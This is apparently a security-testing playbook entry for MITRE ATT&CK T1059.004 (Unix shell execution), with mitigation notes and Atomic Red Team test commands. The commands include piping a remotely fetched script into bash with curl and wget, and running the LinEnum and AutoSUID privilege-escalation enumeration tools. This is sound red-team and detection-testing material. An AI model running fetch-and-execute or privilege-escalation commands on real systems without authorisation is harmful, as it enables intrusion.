---
name: "T1059.004_unix-shell"
description: "Adversaries may abuse Unix shell commands and scripts for execution."
category: "input-validation"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1059.004
  - execution
  - esxi
  - linux
  - macos
  - network-devices
  - sub-technique
technique_id: "T1059.004"
tactic: "execution"
all_tactics:
  - execution
platforms:
  - ESXi
  - Linux
  - macOS
  - Network Devices
mitre_url: "https://attack.mitre.org/techniques/T1059/004"
tech_stack:
  - esxi
  - linux
  - macos
  - network devices
cwe_ids:
  - CWE-94
chains_with:
  - T1059
  - T1059.001
  - T1059.002
  - T1059.003
  - T1059.005
  - T1059.006
  - T1059.007
  - T1059.008
  - T1059.009
  - T1059.010
  - T1059.011
  - T1059.012
  - T1059.013
prerequisites:
  - T1059
severity_boost:
  T1059: "Chain with T1059 for deeper attack path"
  T1059.001: "Chain with T1059.001 for deeper attack path"
  T1059.002: "Chain with T1059.002 for deeper attack path"
---

# T1059.004 Unix Shell

> **Sub-technique of:** T1059

## High-Level Description

Adversaries may abuse Unix shell commands and scripts for execution. Unix shells are the primary command prompt on Linux, macOS, and ESXi systems, though many variations of the Unix shell exist (e.g. sh, ash, bash, zsh, etc.) depending on the specific OS or distribution. Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.

Unix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.

Adversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with SSH. Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence.

Some systems, such as embedded devices, lightweight Linux distributions, and ESXi servers, may leverage stripped-down Unix shells via Busybox, a small executable that contains a variety of tools, including a simple shell.

## Kill Chain Phase

- Execution (TA0002)

**Platforms:** ESXi, Linux, macOS, Network Devices

## What to Check

- [ ] Identify if Unix Shell technique is applicable to target environment
- [ ] Check ESXi systems for indicators of Unix Shell
- [ ] Check Linux systems for indicators of Unix Shell
- [ ] Check macOS systems for indicators of Unix Shell
- [ ] Verify mitigations are bypassed or absent (1 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Create and Execute Bash Shell Script

Creates and executes a simple sh script.

**Supported Platforms:** linux, macos

```bash
sh -c "echo 'echo Hello from the Atomic Red Team' > #{script_path}"
sh -c "echo 'ping -c 4 #{host}' >> #{script_path}"
chmod +x #{script_path}
sh #{script_path}
```

### Atomic Test 2: Command-Line Interface

Using Curl to download and pipe a payload to Bash. NOTE: Curl-ing to Bash is generally a bad idea if you don't control the server.

Upon successful execution, sh will download via curl and wget the specified payload (echo-art-fish.sh) and set a marker file in `/tmp/art-fish.txt`.

**Supported Platforms:** linux, macos

```bash
curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
```

### Atomic Test 3: Harvest SUID executable files

AutoSUID application is the Open-Source project, the main idea of which is to automate harvesting the SUID executable files and to find a way for further escalating the privileges.

**Supported Platforms:** linux

```bash
chmod +x #{autosuid}
bash #{autosuid}
```

**Dependencies:**

- AutoSUID must exist on disk at specified location (#{autosuid})

### Atomic Test 4: LinEnum tool execution

LinEnum is a bash script that performs discovery commands for accounts,processes, kernel version, applications, services, and uses the information from these commands to present operator with ways of escalating privileges or further exploitation of targeted host.

**Supported Platforms:** linux

```bash
chmod +x #{linenum}
bash #{linenum}
```

**Dependencies:**

- LinnEnum must exist on disk at specified location (#{linenum})

### Atomic Test 5: New script file in the tmp directory

An attacker may create script files in the /tmp directory using the mktemp utility and execute them. The following commands creates a temp file and places a pointer to it in the variable $TMPFILE, echos the string id into it, and then executes the file using bash, which results in the id command being executed.

**Supported Platforms:** linux

```bash
TMPFILE=$(mktemp)
echo "id" > $TMPFILE
bash $TMPFILE
```

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Unix Shell by examining the target platforms (ESXi, Linux, macOS).

2. **Assess Existing Defenses**: Review whether mitigations for T1059.004 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1038 Execution Prevention

Use application control where appropriate. On ESXi hosts, the `execInstalledOnly` feature prevents binaries from being run unless they have been packaged and signed as part of a vSphere installation bundle (VIB).

## Detection

### Behavioral Detection of Unix Shell Execution

## Risk Assessment

| Finding                         | Severity | Impact    |
| ------------------------------- | -------- | --------- |
| Unix Shell technique applicable | High     | Execution |

## CWE Categories

| CWE ID | Title                                  |
| ------ | -------------------------------------- |
| CWE-94 | Improper Control of Generation of Code |

## References

- [Apple ZShell](https://support.apple.com/HT208050)
- [DieNet Bash](https://linux.die.net/man/1/bash)
- [Atomic Red Team - T1059.004](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1059.004)
- [MITRE ATT&CK - T1059.004](https://attack.mitre.org/techniques/T1059/004)
